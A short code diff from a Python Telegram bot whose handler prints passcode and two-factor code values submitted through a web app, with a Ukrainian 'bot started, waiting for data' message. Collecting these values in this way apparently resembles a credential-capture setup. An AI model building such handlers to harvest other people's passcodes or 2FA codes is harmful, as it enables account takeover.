@@ -56,9 +56,9 @@ def handle_webapp_data(message):
 def handle_webapp(message):
     data = json.loads(message.web_app_data.data)
     if data.get("action") == "passcode_value":
-        print(data.get("value"))
+        print(data.get("passcode_value"))
     elif data.get("action") == "twofactor_value":
-        print(data.get("value"))
+        print(data.get("twofactor_value"))
 
 print(":white_check_mark: Бот запущено! Очікуємо дані...")
 
